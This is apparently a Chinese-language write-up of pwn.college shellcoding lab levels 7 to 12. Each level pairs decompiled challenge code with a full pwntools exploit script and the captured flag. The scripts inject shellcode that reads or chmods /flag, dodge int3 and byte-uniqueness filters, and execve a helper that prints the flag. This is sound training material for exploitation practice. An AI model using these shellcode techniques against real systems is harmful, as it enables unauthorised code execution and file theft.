  shellcode = mmap((void *)0x2483B000, 0x4000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)612610048 )
    __assert_fail("shellcode == (void *)0x2483b000", "/challenge/babyshell-level-7.c", 0x62u, "main");
  printf("Mapped 0x4000 bytes for shellcode at %p!\n", (const void *)0x2483B000);
  puts("Reading 0x4000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x4000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-7.c", 0x67u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(byte_24A5);
  puts(
    "This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need");
  puts("to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.\n");
  if ( fclose(stdin) )
    __assert_fail("fclose(stdin) == 0", "/challenge/babyshell-level-7.c", 0x6Fu, "main");
  puts(
    "This challenge is about to close stderr, which means that you will not be able to use file descriptor 2 for output.\n");
  if ( fclose(stderr) )
    __assert_fail("fclose(stderr) == 0", "/challenge/babyshell-level-7.c", 0x72u, "main");
  puts(
    "This challenge is about to close stdout, which means that you will not be able to use file descriptor 1 for output. You");
  puts("will see no further output, and will need to figure out an alternate way of communicating data back to yourself.\n");
  if ( fclose(stdout) )
    __assert_fail("fclose(stdout) == 0", "/challenge/babyshell-level-7.c", 0x76u, "main");
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

~开玩笑，没有输入输出错误流还能困得住我不成 LOL~

请原谅我肚子饿了，实在懒得写思路了，现在只想快快恰饭，所以请师傅看 exp。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-7"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.open("/flag")
    shellcode += """
    /* push out_fd */
    push rax
    """
    shellcode += shellcraft.open("./flag", "O_WRONLY | O_CREAT", 0o0644)
    shellcode += """
    /* sendfile('rax', '[rsp+8]', 0, 0x1000) */
    mov rdi, rax
    mov rsi, [rsp+0x8]
    xor rdx, rdx
    mov r10, 0x1000
    mov rax, SYS_sendfile
    syscall
    """
    shellcode += shellcraft.exit(0)

    return asm(shellcode)


def attack(target, payload):
    send_payload(target, payload)

    try:
        with open("./flag", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './flag' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './flag'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

其实这题用 `chmod` 写起来更简单一点呢。

### Flag

Flag: `pwn.college{Y3UgyYnfUmoR24PWDDkCs1W8h92.01MyIDL5cTNxgzW}`

## Level 8

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but you only get 18 bytes.

### Write-up

```c ins={43-48} del={34, 39, 53} collapse={1-30}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x205B4000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)542851072 )
    __assert_fail("shellcode == (void *)0x205b4000", "/challenge/babyshell-level-8.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x205B4000);
  puts("Reading 0x12 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x12uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-8.c", 0x67u, "main");
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-8.c",
      0x6Au,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题在读取数据大小上做了限制，只允许读入 18 bytes。并且读完后把 `buf` 的写权限移除了，因此我们不能通过类似 `read` 的这种 shellcode 把再读数据到别的地方之类的。`execve` 肯定也不可能了，明显会超过 18 bytes。这时候我们发现 `chmod` 是一个很不错的候选，但是不能直接对 `/flag` 使用 `chmod`，不然还是会超。不过既然超的原因是文件名太长，那我们不妨试试建立一个名称短一点的软链接，对软链接进行操作。实测发现对软链接使用 `chmod` 会影响到源文件的权限。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-8"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.chmod("f", 0o4)

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{swqZOtc9CdQUIFCMwrec4E5WBCi.0FNyIDL5cTNxgzW}`

## Level 9

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.

### Write-up

```c ins={44-48} del={40, 64} collapse={1-36, 52-60}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2A207000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)706768896 )
    __assert_fail("shellcode == (void *)0x2a207000", "/challenge/babyshell-level-9.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2A207000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-9.c", 0x67u, "main");
  puts("Executing filter...\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( k / 10 % 2 == 1 )
      *((_BYTE *)shellcode + k) = -52;
  }
  puts("This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an");
  puts(
    "instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your");
  puts("shellcode.\n");
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-9.c",
      0x76u,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2635);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题每隔 `0xa` 字节使用 `0xa` 个 `int3` 中断替换 `0xa` 字节的指令。简单吧，每隔 `0xa` 字节给它塞 `0xa` 个 `nop` 好了，随它换。在此之前使用一条 `jmp` 跳转到 `int3` 之后确保不被 `int3` 干扰，继续执行就好了。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-9"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* chmod(file='f', mode=4) */
    /* push b'f\x00' */
    push 0x66
    mov rdi, rsp
    push 4
    pop rsi
    /* call chmod() */
    jmp continue
    .rept 0xa
        nop
    .endr
continue:
    push 90 /* 0x5a */
    pop rax
    syscall
    """

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{YzFX3cOrT5abYZfD8oqct1wr3xc.0VNyIDL5cTNxgzW}`

## Level 10

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your input is sorted before being executed!

### Write-up

```c ins={48-61} del={44, 70} collapse={1-40, 65-66}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-38h]
  int k; // [rsp+2Ch] [rbp-34h]
  int m; // [rsp+30h] [rbp-30h]
  int v10; // [rsp+34h] [rbp-2Ch]
  const char **i; // [rsp+38h] [rbp-28h]
  const char **j; // [rsp+40h] [rbp-20h]
  _QWORD *v13; // [rsp+48h] [rbp-18h]
  __int64 v14; // [rsp+50h] [rbp-10h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x24AA2000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)615129088 )
    __assert_fail("shellcode == (void *)0x24aa2000", "/challenge/babyshell-level-10.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x24AA2000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-10.c", 0x67u, "main");
  puts("Executing filter...\n");
  v13 = shellcode;
  v10 = ((unsigned __int64)shellcode_size >> 3) - 1;
  for ( k = 0; k < v10; ++k )
  {
    for ( m = 0; m < v10 - k - 1; ++m )
    {
      if ( v13[m] > v13[m + 1] )
      {
        v14 = v13[m];
        v13[m] = v13[m + 1];
        v13[m + 1] = v14;
      }
    }
  }
  puts(
    "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort");
  puts("(e.g., the LSB being the right-most byte).\n");
  printf("This sort processed your shellcode %d bytes at a time.\n", 8);
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_259D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

如果你的 shellcode 足够长的话会对部分指令进行冒泡排序，但是如果比较短的话这个限制就形同虚设了。这里我直接用之前的 exp 了。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-10"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.chmod("f", 0o4)

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{g5e9JB4cUp4THYN75FdmwWgVFA3.0lNyIDL5cTNxgzW}`

## Level 11

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your input is sorted before being executed and stdin is closed.

### Write-up

```c ins={48-61, 72-73} del={44, 75} collapse={1-40, 65-68}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-38h]
  int k; // [rsp+2Ch] [rbp-34h]
  int m; // [rsp+30h] [rbp-30h]
  int v10; // [rsp+34h] [rbp-2Ch]
  const char **i; // [rsp+38h] [rbp-28h]
  const char **j; // [rsp+40h] [rbp-20h]
  _QWORD *v13; // [rsp+48h] [rbp-18h]
  __int64 v14; // [rsp+50h] [rbp-10h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x21A35000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)564350976 )
    __assert_fail("shellcode == (void *)0x21a35000", "/challenge/babyshell-level-11.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x21A35000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-11.c", 0x67u, "main");
  puts("Executing filter...\n");
  v13 = shellcode;
  v10 = ((unsigned __int64)shellcode_size >> 3) - 1;
  for ( k = 0; k < v10; ++k )
  {
    for ( m = 0; m < v10 - k - 1; ++m )
    {
      if ( v13[m] > v13[m + 1] )
      {
        v14 = v13[m];
        v13[m] = v13[m + 1];
        v13[m + 1] = v14;
      }
    }
  }
  puts(
    "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort");
  puts("(e.g., the LSB being the right-most byte).\n");
  printf("This sort processed your shellcode %d bytes at a time.\n", 8);
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(byte_259D);
  puts(
    "This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need");
  puts("to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.\n");
  if ( fclose(stdin) )
    __assert_fail("fclose(stdin) == 0", "/challenge/babyshell-level-11.c", 0x7Fu, "main");
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

就算你把 `stdin` 也关了又如何，不还是无法阻止我使用之前的 exp 哈哈哈哈哈哈哈。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-11"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
        target.recvall(timeout=5)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = shellcraft.chmod("f", 0o4)

    return asm(shellcode)


def attack(target, payload):
    os.system("ln -s /flag f")
    send_payload(target, payload)

    try:
        with open("./f", "r") as file:
            content = file.read()

            log.success(content)
    except FileNotFoundError:
        log.error("The file './f' does not exist.")
    except PermissionError:
        log.error("Permission denied to read './f'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{Ed61x95iAxED3sEmx4x19WauOCW.01NyIDL5cTNxgzW}`

## Level 12

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but every byte in your input must be unique.

### Write-up

```c ins={47-56} del={42, 61} collapse={1-38}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-128h]
  int k; // [rsp+2Ch] [rbp-124h]
  const char **i; // [rsp+30h] [rbp-120h]
  const char **j; // [rsp+38h] [rbp-118h]
  _QWORD v11[34]; // [rsp+40h] [rbp-110h] BYREF

  v11[33] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x1C246000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)472145920 )
    __assert_fail("shellcode == (void *)0x1c246000", "/challenge/babyshell-level-12.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x1C246000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-12.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that every byte in your shellcode is unique!\n");
  memset(v11, 0, 256);
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( *((_BYTE *)v11 + *((unsigned __int8 *)shellcode + k)) )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
    *((_BYTE *)v11 + *((unsigned __int8 *)shellcode + k)) = 1;
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2525);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

就你要每一个字节都得唯一是吧，`execve` 调用外部 shellcode 秒了！

`cdq` 是一字节指令，有时候用来取代 `xor edx, edx` 很不错。它的作用请参考 [CWD/CDQ/CQO — Convert Word to Doubleword/Convert Doubleword to Quadword](https://www.felixcloutier.com/x86/cwd:cdq:cqo).

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-12"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* execve(path='a', argv=0, envp=0) */
    /* push b'a\x00' */
    push 0x61
    mov rdi, rsp
    xor esi, esi
    cdq
    /* call execve() */
    mov al, 59 /* 0x3b */
    syscall
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

我们的 shellcode 的目的就是加载外部脚本完成剩余攻击步骤。注意把下面脚本编译为 `a`（文件名）。

```c
#include <fcntl.h>
#include <sys/sendfile.h>

int main() {
  sendfile(1, open("/flag", O_RDONLY), 0, 0x1000);

  return 0;
}
```

### Flag

Flag: `pwn.college{g4UdtC88x4ayx2CjkFQNdxcSBsC.0FOyIDL5cTNxgzW}`
